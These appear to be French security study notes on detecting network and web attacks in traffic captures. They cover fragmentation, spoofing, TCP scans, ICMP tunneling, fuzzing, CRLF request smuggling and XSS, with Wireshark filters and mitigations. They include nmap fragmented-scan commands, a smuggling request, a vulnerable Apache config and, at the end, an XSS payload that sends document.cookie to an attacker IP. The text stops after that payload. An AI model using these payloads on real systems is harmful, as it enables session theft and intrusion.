Lors de l'analyse du trafic réseau, la couche IP est cruciale pour comprendre le transfert de paquets entre hôtes. Cependant, cette couche ne dispose pas de mécanismes pour détecter les paquets perdus ou altérés, ces problèmes étant gérés par les couches transport et application. Voici les champs clés de l'en-tête IP :
Longueur : La longueur de l'en-tête IP.
Longueur Totale : La longueur totale du paquet IP, y compris les données.
Décalage de Fragmentation : Ce champ est défini lorsque les paquets sont fragmentés, il aide à la réassemblée au niveau du destinataire.
Adresses IP Source et Destination : Identifie les hôtes d'origine et de destination.
L'Abus des Champs de Fragmentation

Les attaquants peuvent manipuler ces champs pour contourner les contrôles réseau. Comprendre l'abus de ces champs peut améliorer la détection lors de l'analyse du trafic.
Techniques d'Abus de la Fragmentation

Les hôtes légitimes fragmentent les paquets pour transférer de grands ensembles de données, suivant la norme Maximum Transmission Unit (MTU). Les attaquants exploitent la fragmentation pour :
Évasion des systèmes de détection d'intrusion (IDS) / systèmes de prévention des intrusions (IPS) : Si l'IDS ne réassemble pas les fragments, les attaquants peuvent utiliser des scans fragmentés (par exemple, avec nmap) pour contourner la détection.
Évasion des Pare-feux : Les paquets fragmentés peuvent contourner les contrôles du pare-feu s'ils ne sont pas réassemblés avant la livraison.
Épuisement des ressources des pare-feux/IPS/IDS : Des tailles MTU petites (par exemple, 10, 15 octets) sollicitent les ressources et peuvent contourner la réassemblée en raison de limites de ressources.
Déni de service (DoS) : Des hôtes anciens peuvent être submergés par des paquets fragmentés volumineux, provoquant une attaque par déni de service.

Un mécanisme réseau correctement configuré devrait utiliser la réassemblée différée, c'est-à-dire attendre tous les fragments avant d'effectuer l'inspection des paquets.
Détection des Anomalies de Décalage de Fragmentation

Pour inspecter les anomalies de fragmentation, ouvrez le fichier de capture dans Wireshark :

wireshark nmapfragfwbypass.pcapng
Indicateurs de Scans Fragmentés
Requêtes ICMP : Les scans nmap ou similaires commencent souvent par des requêtes ICMP pour la découverte d'hôtes.

  nmap &lt;adresseiphôte&gt;
  Paquets Fragmentés avec MTU Spécifié : Les attaquants définissent un MTU spécifique pour fragmenter les paquets.

  nmap -f 10 &lt;adresseip_hôte&gt;
  Les paquets avec une fragmentation répétée d'un hôte peuvent indiquer une attaque par fragmentation.
Un Hôte, Plusieurs Ports : Les scans fragmentés génèrent des réponses avec des flags RST pour les ports fermés, ce qui indique des scans sur plusieurs ports.
Configuration de Wireshark pour la Réassemblée

Si Wireshark ne réassemble pas les paquets automatiquement, vous devez ajuster les paramètres sous Préférences pour le protocole IPv4 afin d'assurer la réassemblée des paquets, facilitant ainsi une inspection plus précise.

Conclusion

L'usage malveillant de la fragmentation, comme dans les attaques par fragmentation de scans ou l'évasion des pare-feu, peut être détecté efficacement avec les bons outils et paramètres. En ajustant correctement Wireshark pour réassembler les paquets, il devient possible de repérer les anomalies de fragmentation et de mieux protéger le réseau contre ces formes d'attaque.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>IP Source &amp; Destination Spoofing Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8047-a226-faf7f62342cd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Manipulation des Champs IP dans le Trafic IPv4 et IPv6

Lors de l'analyse du trafic réseau, il est crucial d'examiner les champs source IP et destination IP, car leur manipulation peut être un indicateur clé d'attaques. Voici les éléments à prendre en compte lors de l’analyse du trafic réseau :
Source IP pour le Trafic Entrant
La source IP du trafic entrant doit toujours appartenir à notre sous-réseau. Une IP externe dans ce contexte pourrait indiquer une tentative de manipulation de paquets, comme le spoofing.
Source IP pour le Trafic Sortant
La source IP du trafic sortant devrait aussi être interne à notre sous-réseau. Une plage d'IP inhabituelle peut suggérer du trafic malveillant provenant de l'intérieur du réseau, éventuellement d'un hôte compromis.
Méthodes d'Attaque Impliquant le Spoofing IP

Les attaquants peuvent manipuler les champs IP source et destination pour diverses raisons :
Scanning avec Appât
Les attaquants modifient l'adresse IP source pour se faire passer pour un hôte du réseau cible afin d'éviter les restrictions du pare-feu et contourner les contrôles de sécurité.
Attaque de Source Aléatoire (DDoS)
Les attaquants envoient un grand volume de trafic depuis des IP source aléatoires dans le but d'épuiser les ressources du serveur cible (attaque par déni de service distribué).
Attaque LAND
L'attaquant modifie l'IP source pour qu'elle corresponde à l'IP de destination, provoquant l'épuisement des ressources ou un plantage de l'hôte cible.
Attaque SMURF
Envoie des paquets ICMP à plusieurs hôtes, avec l'IP de la victime comme adresse source, ce qui inonde la victime de réponses.
Génération de Vecteurs d'Initialisation
Dans les réseaux WEP plus anciens, des paquets avec des IP malveillantes peuvent être injectés pour aider à la construction de tables de décryptage utilisées dans des attaques statistiques.

Ces attaques reposent principalement sur la manipulation des champs IP au niveau de la couche IP, plutôt que sur l'empoisonnement ARP. Toutefois, ces deux méthodes peuvent être combinées dans des attaques sophistiquées.
Détection des Tentatives de Scan avec Appât

Un attaquant peut modifier son IP source pour imiter un hôte légitime, avec pour objectif de contourner les contrôles IDS/pare-feu. Les signes d'un scan avec appât incluent :
Fragmentation initiale en provenance d'une adresse spoofée.
Trafic TCP provenant d'une adresse source légitime, avec des flags RST pour les ports fermés.
Techniques de Détection :
Reconstruction des Paquets : Assurez-vous que les systèmes IDS/IPS/pare-feu peuvent reconstituer les paquets et analyser le comportement du trafic de la machine de destination.
Consistance des Connexions : Surveillez les connexions initiées par une machine et terminées par une autre, ce qui peut être un indicateur de cachage d'adresse.
Détection des Attaques de Source Aléatoire

Les attaques de source aléatoire sont souvent utilisées dans les attaques par déni de service, où un grand nombre de sources aléatoires sont utilisées pour cibler un service particulier. Les indicateurs incluent :
Utilisation d'un seul port par plusieurs hôtes aléatoires.
Ports de base incrémentiels : les ports de base sont constants avec peu de variation.
Longueur uniforme des paquets : Contrairement au trafic légitime des utilisateurs, les paquets créés peuvent avoir une longueur uniforme.
Détection des Attaques SMURF

Les attaques SMURF exploitent les paquets ICMP en envoyant des demandes ICMP à plusieurs hôtes avec l'IP de la victime comme adresse source. Cela fait en sorte que chaque hôte réponde à la victime, la noyant sous une masse de réponses.
Étapes de l'Attaque SMURF :
Envoi de requêtes ICMP à des hôtes actifs avec l'IP de la victime comme source.
Réponses ICMP envoyées par les hôtes vers la victime, la saturant de trafic.
Détection :
Réponses ICMP excessives à une seule cible.
Des paquets ICMP fragmentés ou dotés de données supplémentaires peuvent être utilisés pour amplifier le volume de l'attaque.
Détection des Attaques LAND

Les attaques LAND consistent à falsifier l'IP source pour qu'elle corresponde à l'IP de destination. Cette attaque crée une surcharge en envoyant un trafic élevé à un hôte cible, ce qui empêche l'établissement de connexions légitimes.
Symptomatiques de l'Attaque LAND :
Une congestion du réseau et des ressources sur l'hôte cible à cause de la tentative de connexions incessantes à partir de la même adresse IP.
Conclusion

Les attaques fondées sur la manipulation des champs IP, telles que le spoofing et les attaques DDoS utilisant des IP sources aléatoires, représentent des risques considérables pour la sécurité des réseaux. Une détection efficace de ces attaques repose sur l'analyse minutieuse des modèles de trafic et la capacité à reconstituer les paquets. La vigilance continue au niveau des systèmes IDS/IPS, des pare-feu et des mesures de sécurité réseau est essentielle pour identifier ces menaces et les contrer de manière proactive.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>IP Time-to-Live Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-809b-8db1-d26ad845bfb7"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Manipulation du Time-to-Live (TTL) dans les Attaques

Les attaques utilisant la manipulation du Time-to-Live (TTL) sont une technique d’évasion utilisée par les attaquants pour contourner les systèmes de détection tels que les pare-feu, IDS et IPS. Voici le fonctionnement de la manipulation de TTL :
Manipulation du TTL
Création de Paquets avec un TTL Bas : L'attaquant configure le TTL à une valeur basse (par exemple, 1, 2, 3).
Décrémentation du TTL : À chaque saut (hop) sur le réseau, le TTL est réduit de 1.
Rejet des Paquets : Lorsque le TTL atteint zéro, le paquet est rejeté, avant d'atteindre idéalement un pare-feu ou un filtre.
Réponse ICMP : Les paquets expirés déclenchent des messages ICMP Time Exceeded envoyés par les routeurs sur le chemin vers l'origine du paquet.
Détection des Anomalies de TTL

Pour détecter la manipulation du TTL, il est essentiel de capturer et d’analyser le trafic à l’aide de Wireshark. Bien qu'une instance isolée soit difficile à repérer, les attaquants utilisent souvent la manipulation du TTL lors de scans de ports, générant des motifs détectables.
Indicateurs de Manipulation de TTL
SYN, ACK provenant de Ports de Service : Une réponse SYN, ACK légitime provenant d'un port de service peut indiquer qu'un pare-feu a été contourné.
Valeurs TTL Basses : Lors de l'examen du champ TTL dans l’onglet IPv4 de Wireshark, des valeurs de TTL anormalement basses peuvent indiquer des paquets manipulés.
Stratégie de Mitigation

Une stratégie de mitigation consiste à mettre en place un contrôle qui filtre ou rejette les paquets ayant un TTL en dessous d'un certain seuil. Cela permet de prévenir les attaques par manipulation du TTL qui exploitent les paquets IP craftés pour contourner les défenses réseau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>TCP Handshake Abnormalities</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-804a-99d5-f9ec9d0237f1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Probing TCP Services: Understanding Anomalous Behavior

When attackers probe TCP services, they often exploit various scanning techniques that deviate from standard traffic patterns. These behaviors can reveal malicious intent and indicate attempts to identify vulnerable services. To understand these anomalies, we first need to review how a standard TCP 3-way handshake works.

TCP Handshake Overview
SYN Request: The client sends a SYN packet to initiate the connection to the target port.
SYN-ACK Response: If the target port is open, the server responds with a SYN-ACK, acknowledging the request and indicating that the port is open.
ACK Completion: The client responds with an ACK to complete the handshake and establish the connection.
Common TCP Flags and Their Functions
URG (Urgent): Indicates that the data should be processed immediately.
ACK (Acknowledgment): Acknowledges that data has been received.
PSH (Push): Pushes data to the application layer immediately.
RST (Reset): Terminates the connection, often used in attack scenarios.
SYN (Synchronize): Initiates the connection during the handshake.
FIN (Finish): Ends the connection.
ECN (Explicit Congestion Notification): Notifies the sender of network congestion.

These flags are essential in tracking the state of TCP connections and can help identify unusual or malicious activity.

Indicators of Abnormal TCP Handshake Patterns

When attackers probe services, certain abnormal behaviors can be observed during the TCP handshake or communication. These anomalies often serve as indicators of malicious activity:
Excessive Flags: If multiple flags are used in one packet, or if the same flag appears repeatedly, this may indicate a scanning attempt.
Unusual Flag Combinations: Combinations of flags that are not typically used together can suggest attempts to exploit vulnerabilities (e.g., RST flag usage in attempts to terminate or hijack connections).
Single Host Targeting Multiple Ports or Hosts: Scans from a single host that target multiple ports or hosts are common in network reconnaissance. These could be decoy scans, or the attacker could be trying random source IPs to evade detection.

Types of TCP Scans
SYN Scan (Half-Open Scan)
Technique: The attacker sends a SYN packet to a target port. If the port is open, the server responds with a SYN-ACK. The attacker then sends an RST to close the connection without completing the handshake.
Response:
Open Port: SYN-ACK response from the server.
Closed Port: RST response from the server.
Detection: This scan technique is stealthy because the attacker does not complete the handshake, leaving less trace in the target system's logs.
SYN Stealth Scan
Technique: Similar to SYN Scan, but the attacker only partially completes the handshake (e.g., only sends a SYN and never sends an ACK). This helps avoid detection by intrusion detection systems (IDS) and firewalls.
Response:
Open Port: SYN-ACK response.
Closed Port: No response or an RST.
Detection: This scan is particularly difficult to detect because it never fully establishes a connection.
NULL Scan
Technique: The attacker sends TCP packets with no flags set, which can confuse the target system.
Response:
Open Port: No response from the system.
Closed Port: The system replies with an RST packet.
Detection: NULL scans exploit the fact that some systems do not respond to packets with no flags set, while others will send an RST for closed ports.
ACK Scan
Technique: In an ACK scan, the attacker sends packets with the ACK flag set. This can be used to map out firewalls or filtering devices by determining whether the port is open or closed.
Response:
Open Port: No response or an RST packet (depending on firewall configuration).
Closed Port: An RST packet response.
Detection: The ACK scan can help the attacker determine which ports are filtered and which are open/closed, providing useful information for further attacks.
FIN Scan
Technique: All packets are sent with the FIN flag set. This is a highly unusual scan technique.
Response:
Open Port: No response from the system.
Closed Port: The system replies with an RST packet.
Detection: Like the NULL scan, the FIN scan relies on peculiar behavior from the target system, and is easily detectable if the attacker sends packets with the FIN flag in an unexpected context.
Xmas Tree Scan
Technique: The attacker sends packets with all flags set (SYN, FIN, URG, PSH, RST, and ACK). This scan is designed to confuse the target system or firewall.
Response:
Open Port: No response or an RST packet (depending on firewall or system configuration).
Closed Port: An RST response.
Detection: Xmas tree scans are easily identifiable because all the flags are set, which is highly unusual for normal network traffic.

Summary of TCP Scan Responses

| Scan Type        | Flags Used | Open Port Response | Closed Port Response |
| -------------------- | -------------- | ---------------------- | ------------------------ |
| SYN Scan         | SYN            | SYN-ACK                | RST                      |
| SYN Stealth Scan | SYN            | SYN-ACK                | No Response / RST        |
| NULL Scan        | No Flags       | No Response            | RST                      |
| ACK Scan         | ACK            | No Response / RST      | RST                      |
| FIN Scan         | FIN            | No Response            | RST                      |
| Xmas Tree Scan   | All Flags      | No Response / RST      | RST                      |

Conclusion

TCP scanning techniques, such as SYN, FIN, NULL, and Xmas Tree scans, all rely on manipulating specific flags to achieve reconnaissance while evading detection. By analyzing these abnormal TCP patterns—whether excessive flag use, unusual flag combinations, or multiple host and port targeting—security professionals can detect early signs of malicious scanning or probing. Identifying these patterns through tools like Wireshark is critical for preventing potential attacks that may follow.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>TCP Connection Resets &amp; Hijacking</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-802f-a5ce-ca0464016afb"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Attaques sur les Connexions TCP : Terminaison et Détournement de Connexion

Les connexions TCP, bien que robustes dans de nombreux contextes, présentent des vulnérabilités, notamment en ce qui concerne la protection contre l'interruption ou le détournement des connexions. Ces failles peuvent se manifester par des attaques de terminaison de connexion via des paquets RST ou par des techniques plus avancées de détournement de connexion.
Terminaison de Connexion TCP via Paquets RST

Une attaque par injection de paquets RST (ou terminaison de connexion TCP) vise à perturber un service réseau. Cette attaque se déroule selon les étapes suivantes :
Usurpation de Source : L'attaquant usurpe l'adresse source pour la faire correspondre à celle de la machine cible.
Injection de Paquet RST : L'attaquant crée un paquet TCP avec le drapeau RST pour forcer la terminaison de la connexion active.
Port de Destination Ciblé : L'attaquant spécifie un port de destination actuellement utilisé par la machine cible.
Détection des Attaques TCP RST

Pour détecter une attaque par RST, vous pouvez chercher plusieurs indicateurs dans Wireshark ou d'autres outils de capture de paquets :
Volume Anormal de Paquets : Une quantité anormale de paquets envoyés à un port unique peut être un signe d'attaque RST. Cela se manifeste généralement sous forme de paquets répétitifs avec le drapeau RST activé.
Discrépance des Adresses MAC : Si des paquets avec une IP usurpée (par exemple, 192.168.10.4) sont observés avec une adresse MAC inattendue, cela peut indiquer une activité malveillante. En effet, un paquet usurpé doit correspondre à l'adresse MAC de la machine cible, mais une incohérence suggère un attaquant tentant de perturber la connexion.

Notez que l'usurpation d'adresse MAC est possible, mais elle peut entraîner des incohérences, notamment en cas d'empoisonnement ARP.

Détournement de Connexion TCP

Les attaques plus sophistiquées incluent le détournement de connexion TCP, où l'attaquant prend le contrôle d'une session TCP active. Cette attaque implique plusieurs techniques complexes :
Prédiction des Numéros de Séquence : L'attaquant prédit les numéros de séquence pour injecter des paquets au bon endroit dans la connexion cible, imitant ainsi le flux légitime de données.
Usurpation de Source : Comme pour les attaques RST, l'attaquant usurpe l'adresse IP source pour imiter la machine cible.
Blocage des ACKs : Pour maintenir la connexion détournée, l'attaquant bloque ou retarde les paquets ACK (Accusé de Réception) envoyés par la machine cible. Cela permet de maintenir un flux continu de données sans que la machine cible puisse rétablir le contrôle.
Indicateurs de Détournement de Connexion TCP

Plusieurs anomalies peuvent indiquer une tentative de détournement de connexion TCP :
Anomalies dans les Numéros de Séquence : Des numéros de séquence incohérents ou inhabituels peuvent suggérer des tentatives de prédiction de séquence, ce qui est typique des attaques de détournement de connexion.
ACKs Bloqués ou Retardés : Si les paquets ACK sont retardés ou absents, cela peut indiquer que l'attaquant tente de prendre le contrôle de la session en bloquant la confirmation des paquets envoyés.

Le détournement de connexion TCP est souvent couplé avec des techniques comme l'empoisonnement ARP, qui permet à l'attaquant de manipuler les adresses MAC dans le réseau, rendant le trafic plus difficile à tracer.

Conclusion

Les attaques sur les connexions TCP, telles que l'injection de paquets RST et le détournement de connexions, exploitent des failles inhérentes au protocole TCP. La détection de ces attaques repose sur l'observation des anomalies dans les numéros de séquence, des paquets RST répétitifs, ainsi que des incohérences dans les adresses MAC et les paquets ACK. Pour se défendre contre ces attaques, il est essentiel de :
Analyser attentivement les flux TCP pour repérer les anomalies dans le trafic.
Vérifier la configuration des pare-feu et des réseaux pour détecter et bloquer les activités suspectes.
Utiliser des protocoles sécurisés comme SSH à la place de Telnet pour limiter les risques d'interception de connexion.

En surveillant activement ces indicateurs et en mettant en œuvre des contrôles de sécurité appropriés, il est possible de détecter et d'atténuer les attaques basées sur TCP avant qu'elles ne causent des dommages importants.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>ICMP Tunneling</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80d7-be46-e0c997be0fb1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Le tunneling est une méthode utilisée par les attaquants pour exfiltrer des données d'un système vers un autre, souvent en exploitant des protocoles de confiance ou des proxies autorisés par les contrôles réseau.
Les Bases du Tunneling

Lorsqu'un attaquant a besoin d'envoyer des données vers un hôte externe, il peut utiliser le tunneling. Cela peut se faire en établissant une commande et un contrôle sur une machine compromise. Les attaquants utilisent divers protocoles pour le tunneling, notamment SSH, HTTP, HTTPS, DNS et ICMP, chacun permettant de contourner les mesures de sécurité réseau.
ICMP Tunneling

L'ICMP tunneling consiste à insérer des données dans le champ de données des requêtes ICMP pour les dissimuler dans le trafic réseau normal. Comme ICMP est un protocole légitime utilisé pour la gestion des réseaux, il est souvent négligé par les mécanismes de sécurité, ce qui permet aux attaquants de contourner facilement les contrôles réseau.
Détection de l'ICMP Tunneling

Le tunneling ICMP implique l'insertion de données dans le champ de données des requêtes ICMP, ce qui peut être détecté en examinant la taille des données dans les requêtes et réponses ICMP. Voici quelques méthodes pour identifier ce type d'attaque :
Filtrage ICMP avec Wireshark

Utilisez le filtre ICMP dans Wireshark pour visualiser le trafic spécifique ICMP :

icmp
Détection de Transferts de Données Importants

Le trafic ICMP fragmenté ou des champs de données exceptionnellement larges peuvent indiquer un tunneling. Les requêtes ICMP normales ont des champs de données relativement petits (environ 48 octets). Si la taille du champ de données dépasse 48 octets, cela pourrait signaler un transfert de données, souvent lié au tunneling. Les tailles de données peuvent parfois atteindre 38 000 octets dans des attaques avancées.
Inspection du Contenu des Données

Dans Wireshark, vous pouvez inspecter le contenu des données dans les requêtes ICMP pour détecter des informations sensibles (comme des identifiants, des mots de passe, etc.). Cela peut être un signe direct de tunneling ICMP. Si les données semblent codées ou cryptées, elles nécessitent une attention particulière.
Décodage des Données Encodées

Les attaquants peuvent encoder ou crypter les données exfiltrées dans les paquets ICMP pour éviter la détection. Dans ce cas, le décodage manuel des données encodées pourrait être nécessaire. Par exemple, si vous détectez une chaîne encodée en base64, vous pouvez utiliser la commande suivante pour la décoder :

echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
Cela renverra le texte décodé, qui pourrait contenir des informations sensibles exfiltrées.
Anomalies de Taille de Données ICMP

Si les tailles de données ICMP dépassent les tailles typiques (environ 48 octets), cela nécessite une analyse plus approfondie. Un transfert de données excessif dans un paquet ICMP est souvent un indicateur clé de tunneling.
Prévention du Tunneling ICMP

Voici quelques méthodes pour prévenir et limiter l'impact des attaques par tunneling ICMP :
Bloquer les Requêtes ICMP

   Désactiver les requêtes ICMP dans le réseau peut empêcher le tunneling ICMP, bien que cela puisse affecter les diagnostics de réseau légitimes. Cette approche empêche les attaquants d'utiliser ICMP comme vecteur pour le tunneling.
Inspecter les Requêtes et Réponses ICMP

   En surveillant et en analysant le trafic ICMP, surtout les champs de données, il est possible de détecter et d'atténuer les activités suspectes de tunneling. Les administrateurs réseau doivent être attentifs aux anomalies dans les tailles de données ICMP et aux tentatives de communication cachées.
Conclusion

Le tunneling ICMP représente une méthode sophistiquée d'exfiltration de données. Cependant, avec une surveillance appropriée et l'utilisation d'outils comme Wireshark, il est possible de détecter des anomalies dans le trafic ICMP et de prendre des mesures pour protéger le réseau. Les efforts de prévention, comme la désactivation du ICMP ou l'inspection continue du trafic réseau, sont essentiels pour prévenir ce type de menace.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>HTTP &amp; HTTPs Service Enumeration</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8058-a25b-e62400f8feec"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Détection et Prévention des Tentatives de Fuzzing sur les Serveurs Web

Les modèles de trafic HTTP/HTTPS inhabituels peuvent indiquer des attaques potentielles contre les serveurs web. Les attaquants exploitent souvent les vulnérabilités de la couche de transport pour collecter des informations, explorer ou exploiter les applications web. L'une de ces méthodes d'attaque est le fuzzing, qui consiste à envoyer des données aléatoires ou inattendues à un serveur pour découvrir des vulnérabilités.
Indicateurs des Tentatives de Fuzzing

Les signes courants des tentatives de fuzzing incluent :
Un trafic HTTP/HTTPS excessif provenant d'un seul hôte, souvent avec des modèles de requêtes irréguliers.
Des tentatives d'accès répétitives ou inhabituelles trouvées dans les journaux d'accès du serveur web, comme des requêtes pour des fichiers ou des répertoires inexistants.
Détection du Fuzzing de Répertoires

Le fuzzing de répertoires consiste à tester l'existence de pages web ou de répertoires vulnérables. Cela se fait généralement en envoyant de nombreuses requêtes HTTP pour différents chemins.
Filtre Wireshark pour le Fuzzing de Répertoires :
Filtre de base :
Filtrer le trafic HTTP : http
Isoler les requêtes :
Pour se concentrer uniquement sur les requêtes (excluant les réponses) : http.request
Indicateurs du Fuzzing de Répertoires :
Réponses 404 fréquentes, ce qui indique des tentatives répétées d'accès à des fichiers ou répertoires inexistants.
Séquences de requêtes rapides, où plusieurs requêtes sont envoyées dans une courte période.
Exemple :

Les journaux d'accès peuvent afficher des entrées comme celles-ci :

192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bashhistory HTTP/1.1" 404 435 "-" "Mozilla/4.0"
Analyser les Journaux du Serveur Web pour le Fuzzing

Pour détecter les tentatives de fuzzing sur votre serveur web, inspectez les journaux d'accès pour repérer une activité inhabituelle.
Commandes pour Filtrer les Journaux par Adresse IP :
Avec grep :

  cat access.log | grep "192.168.10.5"
  Avec awk :

  cat access.log | awk '$1 == "192.168.10.5"'
  Recherchez des accès rapides et répétitifs à des ressources non existantes (comme .bashhistory, .git, ou des demandes de chemins inhabituels).

Détecter d'Autres Techniques de Fuzzing

Les attaquants peuvent également cibler des éléments dynamiques ou statiques de la page web, comme des champs ID, ou tester des vulnérabilités de type IDOR (Insecure Direct Object Reference). Ils peuvent utiliser des outils pour envoyer ces charges utiles, en particulier lors de l'analyse de JSON.
Filtre Wireshark pour l'Analyse d'un Hôte Spécifique :

Pour examiner le trafic provenant d'un hôte spécifique, appliquez le filtre suivant :

http.request and ((ip.srchost == &lt;IP suspectée&gt;) or (ip.dsthost == &lt;IP suspectée&gt;))
Suivre les Flux HTTP :
Faites un clic droit sur n'importe quelle requête HTTP dans Wireshark et sélectionnez Follow &gt; HTTP Stream pour voir la séquence complète des requêtes et réponses de cette session.
Indicateurs du Fuzzing Avancé :
Modèles de requêtes rapides, surtout pour des ressources qui n'existent pas.
Attaques échelonnées ou distribuées, où les requêtes sont étendues dans le temps ou réparties sur plusieurs adresses IP pour éviter la détection.

Prévenir les Tentatives de Fuzzing

Pour se protéger contre les tentatives de fuzzing et réduire le risque d'exploitation réussie :
Ajuster les Configurations du Serveur :
Configurez votre serveur (par exemple, Apache ou Nginx) pour retourner les codes de réponse appropriés pour les ressources inexistantes.
Utilisez des pages d'erreur personnalisées qui ne révèlent pas d'informations sensibles sur la structure ou les fonctionnalités du serveur.
Mettre en place des Règles de Web Application Firewall (WAF) :
Les WAF peuvent bloquer des IP spécifiques ou des modèles de comportement suspect, comme des taux de requêtes inhabituels ou des tentatives répétées d'accès à des ressources inexistantes.
Limiter le Taux de Requêtes :
Implémentez des techniques de limitation du taux pour réduire l'efficacité des outils automatisés de fuzzing.
Contrôle d'Accès :
Assurez-vous que les répertoires ou fichiers sensibles sont correctement sécurisés ou cachés de l'accès public (par exemple, .git, .bash_history).

En surveillant activement ces modèles et en mettant en place des protections robustes, les serveurs web peuvent être mieux protégés contre les attaques par fuzzing.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Strange HTTP Headers</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8035-bdf9-d8ddf779ad2e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic du Serveur Web et Détection des Activités Suspectes

Lorsque vous analysez le trafic d'un serveur web, l'absence de signes évidents comme le fuzzing ne garantit pas la sécurité. Une inspection plus approfondie, en particulier des en-têtes HTTP inhabituels, peut révéler une activité suspecte. Voici quelques anomalies courantes à surveiller :
En-têtes Host Anormaux

Les en-têtes Host manipulés ou inattendus sont souvent un signe d'attaque. Par exemple, un attaquant pourrait tenter de forcer un serveur à exécuter une requête vers une adresse ou un sous-domaine non autorisé, ou à contourner des restrictions de domaine.
Filtrage du Trafic HTTP

Commencez par limiter le trafic dans Wireshark pour observer uniquement les requêtes et réponses HTTP :

http
Isolation des En-têtes Host Irréguliers

Spécifiez l'adresse IP du serveur légitime pour exclure le trafic normal. Pour un serveur externe, remplacez par le nom de domaine :

http.request and (!(http.host == "192.168.10.7"))
Indicateurs de Manipulation des En-têtes Host

Examinez les résultats pour détecter des en-têtes Host suspects tels que 127.0.0.1 ou des noms d'hôte inhabituels comme admin. Les attaquants manipulent souvent ces en-têtes pour escalader les privilèges en utilisant des outils de proxy comme Burp Suite.
Mesures Préventives :
Vérifiez les configurations virtualhost et d'accès pour empêcher un accès non autorisé.
Gardez votre serveur web mis à jour.

Analyse des Erreurs 400 et Détection du Smuggling de Requêtes

Le code d'erreur 400 (Bad Request) peut indiquer une activité suspecte et est utile pour identifier des actions HTTP malveillantes, notamment les attaques de smuggling de requêtes (injection CRLF).
Filtrage des Réponses de Code 400

Pour détecter les tentatives de request smuggling, filtrez les réponses avec le code 400 dans Wireshark :

http.response.code == 400
Suivez ces flux HTTP pour découvrir des tentatives de CRLF Injection, une forme de smuggling où un attaquant tente de contourner les contrôles de sécurité via des en-têtes HTTP malformés.
Exemple de Tentative de CRLF

Un attaquant pourrait construire une requête comme suit :

GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5
\r\n
GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080
\r\n
HTTP/1.1
Host: 192.168.10.5
Décodé par le serveur, cela donne deux requêtes distinctes :

GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5

GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080

HTTP/1.1
Host: 192.168.10.5
Si le serveur est vulnérable, les deux requêtes peuvent réussir, permettant un accès non autorisé.
Exemple de Configuration Apache Vulnérable

Certaines configurations Apache mal sécurisées peuvent laisser le serveur vulnérable à ce type d'attaque :

&lt;VirtualHost :80&gt;
    RewriteEngine on
    RewriteRule "^/categories/(.)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
    ProxyPassReverse "/categories/" "http://192.168.10.100:8080/"
&lt;/VirtualHost&gt;
Cette mauvaise configuration permet à l'attaquant de rediriger les requêtes vers un autre serveur sans restrictions, facilitant l'attaque de smuggling de requêtes.

Surveillance des Exploits Réussis

Pour détecter un exploit réussi, surveillez la présence d'un code 200 (Success) en réponse à une requête suspecte. Une analyse régulière des réponses avec les codes 400 et 200 est essentielle pour identifier et atténuer les actions adverses dans le trafic HTTP.

En résumé, la détection des attaques de manipulation des en-têtes Host et de request smuggling repose sur une vigilance constante sur les erreurs HTTP, les anomalies dans les en-têtes et le suivi des codes de statut HTTP dans le trafic.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Cross-Site Scripting (XSS) &amp; Code Injection Detection</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8042-a834-ca859d33ab7b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Détection d'un comportement anormal dans le trafic HTTP

Un volume inhabituel de requêtes HTTP vers un "serveur" interne inconnu peut signaler une activité suspecte, notamment une attaque de type Cross-Site Scripting (XSS). Ces requêtes peuvent servir à exfiltrer des cookies ou des jetons de session, même si les valeurs sont souvent encodées ou chiffrées en transit.

Cross-Site Scripting (XSS)

L’XSS survient lorsqu’un attaquant injecte du code JavaScript malveillant dans une page web via des champs d'entrée utilisateur. Ce code est ensuite exécuté dans le navigateur des autres utilisateurs, permettant à l’attaquant de voler des données sensibles comme les cookies ou tokens de session.
Exemple de payload XSS :

&lt;script&gt;
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
&lt;/script&gt;
Ce que fait ce script : il capture les cookies de l’utilisateur et les envoie silencieusement à une IP interne contrôlée par l’attaquant.
Si ce type de code est détecté :
